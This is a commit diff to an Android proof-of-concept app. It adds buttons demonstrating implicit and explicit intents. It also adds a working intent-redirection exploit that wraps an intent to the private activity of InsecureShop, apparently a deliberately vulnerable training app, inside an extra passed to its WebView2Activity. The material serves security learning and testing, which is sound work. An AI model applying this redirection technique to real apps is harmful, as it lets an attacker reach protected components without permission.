5ce60ee7b3d2454789c2f29c8b99e280602181a6
Gionne Cannister <gionnec@gmail.com>
2025-01-13 14:49:57 -0500

    Adds implicit intent PoC. Adds explicit intent PoC. Adds insecureshop intent redirection PoC.

--- app/src/main/java/io/gi0cann/javapoc/MainActivity.java
+++ app/src/main/java/io/gi0cann/javapoc/MainActivity.java
@@ -1,8 +1,11 @@
 package io.gi0cann.javapoc;
 
+import android.content.ComponentName;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
 
 import androidx.activity.EdgeToEdge;
 import androidx.appcompat.app.AppCompatActivity;
@@ -23,8 +26,45 @@ public class MainActivity extends AppCompatActivity {
             return insets;
         });
 
-        Intent implicitIntent = new Intent(Intent.ACTION_VIEW);
-        implicitIntent.setData(Uri.parse("https://www.google.com"));
-        startActivity(implicitIntent);
+        // implicit intent
+        Button implicitBtn = (Button) findViewById(R.id.btn_implicit_intent);
+        implicitBtn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Intent intent = new Intent(Intent.ACTION_VIEW);
+                intent.setData(Uri.parse("https://www.google.com"));
+                startActivity(intent);
+            }
+        });
+
+        // explicit intent
+        Button explicitBtn = (Button) findViewById(R.id.btn_explicit_intent);
+        explicitBtn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Intent intent = new Intent();
+                intent.setAction(Intent.ACTION_VIEW);
+                intent.setData(Uri.parse("https://www.bing.com"));
+                intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.IntentDispatcher");
+                startActivity(intent);
+            }
+        });
+
+        // exploit intent redirection bug in com.insecureshop.WebView2Activity activity
+        Button intentRedirectionBtn = (Button) findViewById(R.id.btn_intent_redirection);
+        intentRedirectionBtn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Intent privateIntent = new Intent();
+                privateIntent.setComponent(new ComponentName("com.insecureshop", "com.insecureshop.PrivateActivity"));
+                privateIntent.putExtra("url", "https://www.google.com");
+
+                Intent redirIntent = new Intent();
+                redirIntent.setComponent(new ComponentName("com.insecureshop", "com.insecureshop.WebView2Activity"));
+                redirIntent.putExtra("extra_intent", privateIntent);
+                startActivity(redirIntent);
+            }
+        });
+
     }
 }
